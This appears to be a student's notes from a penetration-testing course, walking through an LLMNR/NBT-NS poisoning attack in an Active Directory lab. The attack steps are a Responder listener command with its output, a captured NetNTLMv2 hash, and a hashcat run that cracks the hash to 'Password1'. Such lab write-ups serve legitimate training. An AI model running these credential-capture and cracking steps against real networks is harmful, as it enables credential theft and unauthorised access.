---
layout: default
title: Initial Attack Vectors
parent: ActiveDirectory
grand_parent: TCM-Sec - PEH
permalink: /tcm-sec-PEH/active-directory/initial-attack-vectors
nav_order: 1
---

# Scanning & Enumeration <!-- markdownlint-disable-line MD025 MD022 -->
{: .no_toc}

## Table of contents <!-- markdownlint-disable-line MD022 -->
{: .no_toc .text-delta}

- TOC
{:toc }

## LLMNR Poisoning

The "NetBIOS and LLMNR Name Poisoning" attack is a man-in-the-middle (MITM) technique that involves manipulating network name resolution protocols to redirect and intercept network traffic, enabling an attacker to compromise communication and gain unauthorized access to systems.


![Alt text](<../../assets/TCM-Sec/AD/Netbios and LLMNR Name Poisoning.png>)


### Step 1. Start the MITM listener on the attacker machine

Here we use the Responder toolkit, a python based tool used for various network security assessments, specifically designed to exploit weaknesses in network protocols.

```console
┌──(kali㉿kali)-[~]
└─$ sudo python /usr/share/responder/Responder.py -I eth0 -dw -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [10.0.2.9]
    Responder IPv6             [fe80::c29:8818:2c:ff5b]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-DHHQNHS3HNM]
    Responder Domain Name      [03CO.LOCAL]
    Responder DCE-RPC Port     [49857]

[+] Listening for events...
                                

[!] Error starting SSL server on port 5986, check permissions or other servers running.
[!] Error starting SSL server on port 443, check permissions or other servers running.
```

Now that the listener is up and running lets initiate a flawed dns request, we'll make a network drive request to the attacker machine for simplicity here.

### 2. Make a flawed DNS request

Making a flawed DNS request on a victim machine

![Flawed DNS Request](<../../assets/TCM-Sec/AD/Flawed DNS request.png>)

The Responder HTTP gets the request and we get the client IP, the NTLM hash as well as the domain and the user name.

```console
[PROXY] Received connection from 10.0.2.16
[HTTP] GET request from: ::ffff:10.0.2.16  URL: / 
[HTTP] NTLMv2 Client   : 10.0.2.16
[HTTP] NTLMv2 Username : MARVEL\Frank
[HTTP] NTLMv2 Hash     : Frank::MARVEL:7dfb054dc6c5fe48:FEE1D6BE28364715DA41C4102F95B624:01010000000000006F5F
A65BD6B4D9013C9BD5DAB98FE6090000000002000800470043003000330001001E00570049004E002D005600430045004500590058004
80055004B0046004A000400140047004300300033002E004C004F00430041004C0003003400570049004E002D00560043004500450059
005800480055004B0046004A002E0047004300300033002E004C004F00430041004C000500140047004300300033002E004C004F00430
041004C000800300030000000000000000100000000100000FDDFF309592F822CCEEF84C50B7191FD04413B99EFE1F6BB19D07637A4B8
EBEF0A0010000000000000000000000000000000000009001A0048005400540050002F00310030002E0030002E0032002E00390000000
00000000000   
```

Let see if we can simply crack that hash using hashcat.

```console
──(kali㉿kali)-[~]
└─$ hashcat 'Frank::MARVEL:38140d92e111e3df:B04456F69DED2D7610B1532F633B9C0D:0101000000000000A8ED7064D6B4D901
43EF0174E3FFDD8F0000000002000800470043003000330001001E00570049004E002D00560043004500450059005800480055004B004
6004A000400140047004300300033002E004C004F00430041004C0003003400570049004E002D00560043004500450059005800480055
004B0046004A002E0047004300300033002E004C004F00430041004C000500140047004300300033002E004C004F00430041004C00080
0300030000000000000000100000000100000FDDFF309592F822CCEEF84C50B7191FD04413B99EFE1F6BB19D07637A4B8EBEF0A001000
0000000000000000000000000000000009001A0048005400540050002F00310030002E0030002E0032002E0039000000000000000000' 
/usr/share/wordlists/rockyou.txt --force     
hashcat (v6.2.6) starting in autodetect mode

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-penryn-Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz, 2189/4443 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5600 | NetNTLMv2 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

FRANK::MARVEL:38140d92e111e3df:b04456f69ded2d7610b1532f633b9c0d:0101000000000000a8ed7064d6b4d90143ef0174e3ffdd8f0000000002000800470043003000330001
001e00570049004e002d00560043004500450059005800480055004b0046004a000400140047004300300033002e004c004f00430041004c0003003400570049004e002d0056004300
4500450059005800480055004b0046004a002e0047004300300033002e004c004f00430041004c000500140047004300300033002e004c004f00430041004c00080030003000000000
0000000100000000100000fddff309592f822cceef84c50b7191fd04413b99efe1f6bb19d07637a4b8ebef0a0010000000000000000000000000000000000009001a00480054005400
50002f00310030002e0030002e0032002e0039000000000000000000:Password1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: FRANK::MARVEL:38140d92e111e3df:b04456f69ded2d7610b1...000000
Time.Started.....: Wed Jul 12 17:43:26 2023, (0 secs)
Time.Estimated...: Wed Jul 12 17:43:26 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    22988 H/s (3.06ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: slimshady -> oooooo
Hardware.Mon.#1..: Util: 17%

Started: Wed Jul 12 17:42:49 2023
Stopped: Wed Jul 12 17:43:27 2023
```

> Success... the password is "Password1". Sloppy ^^

2. TCM-Sec/7. ActiveDirectory/1. InitialAttackVectors.md

---


